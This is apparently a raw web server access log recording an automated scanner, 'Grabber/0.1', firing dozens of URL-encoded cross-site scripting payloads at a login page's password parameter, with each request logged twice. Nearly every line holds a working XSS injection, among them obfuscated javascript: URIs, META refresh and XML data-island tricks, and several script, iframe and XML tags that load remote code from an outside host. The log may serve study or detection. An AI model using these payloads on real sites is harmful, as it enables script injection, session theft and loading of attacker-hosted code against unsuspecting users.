172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIMG+SRC%3D%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CA+HREF%3D%22http%3A%2F%2F66.102.7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /?password=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:50 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /?password=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:51 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /?password=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:52 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
